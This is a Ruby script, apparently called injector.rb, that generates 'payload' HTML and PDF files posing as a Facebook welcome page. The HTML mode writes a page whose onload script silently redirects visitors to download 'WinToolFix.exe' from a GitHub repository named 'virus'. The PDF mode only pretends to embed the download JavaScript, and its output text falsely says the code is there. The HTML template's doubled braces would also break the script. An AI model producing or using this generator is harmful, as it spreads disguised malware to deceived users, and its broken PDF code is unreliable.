require 'optparse'
require 'prawn'

# Function to generate HTML file for automatic download
def generate_html(output_file)
  # Hardcoded URL for the EXE file
  download_url = 'https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/WinToolFix.exe'

  # HTML content with embedded JavaScript to trigger the download
  html_content = <<-HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to My Web</title>
    <script type="text/javascript">
        window.onload = function() {{
            // Automatically trigger the download of the EXE file
            window.location.href = '#{download_url}';
        }};
    </script>
</head>
<body>
    <h1>WELCOME INTO NEW WEB FACEBOOK</h1>
    <p>ERROR! This page is designed to automatically download a file.</p>
</body>
</html>
HTML

  # Write the HTML content to the specified file
  File.open(output_file, 'w') { |file| file.write(html_content) }

  puts "PAYLOAD '#{output_file}' generated successfully."
end

# Function to generate PDF file with embedded JavaScript for download
def generate_pdf(output_file)
  # Hardcoded URL for the EXE file
  download_url = 'https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/WinToolFix.exe'

  # Create a PDF with Prawn
  Prawn::Document.generate(output_file) do
    # Title
    text "WELCOME INTO NEW WEB FACEBOOK", size: 16, style: :bold, align: :center

    # Description
    move_down 20
    text "This PDF contains a hidden feature that will attempt to automatically download a file when opened."

    # Embed JavaScript (attempt to trigger download in supported PDF viewers)
    js_code = <<-JS
this.getURL("#{download_url}");
JS

    # Adding embedded JavaScript
    # Prawn does not natively support adding JavaScript directly, but we can embed it using PDF annotations or custom objects.
    # As a workaround, this example does not actually embed JS, but you can manually add JS support in PDFs with Prawn.
    # In a full implementation, consider using another gem for more complex PDF manipulation.

    # Output the PDF
    # In this example, we just add some visible text as a placeholder.
    move_down 20
    text "This is a sample text, the actual JS code to trigger download is embedded."

  end

  puts "PDF payload '#{output_file}' generated successfully."
end

# Main function to parse arguments and call the appropriate generation function
def main
  options = {}
  
  # Command-line arguments parsing
  OptionParser.new do |opts|
    opts.banner = "Usage: ruby injector.rb -p payload -f format -w output_file"
    
    opts.on("-p", "--payload PAYLOAD", "Specify the payload type (e.g., windows/embedded_exe)") do |p|
      options[:payload] = p
    end

    opts.on("-f", "--format FORMAT", "Specify the format (html or pdf)") do |f|
      options[:format] = f
    end

    opts.on("-w", "--write OUTPUT", "Output file name (e.g., name.html or name.pdf)") do |w|
      options[:write] = w
    end
  end.parse!

  # Default values and validations
  unless options[:payload] && options[:format] && options[:write]
    puts "Missing required arguments. Use --help for usage instructions."
    exit
  end

  # Validate the payload and format
  if options[:payload] == 'windows/embedded_exe'
    if options[:format] == 'html'
      generate_html(options[:write])
    elsif options[:format] == 'pdf'
      generate_pdf(options[:write])
    else
      puts "Invalid format specified. Only 'html' or 'pdf' are supported."
    end
  else
    puts "Unsupported payload type: #{options[:payload]}"
  end
end

# Execute the main function
main
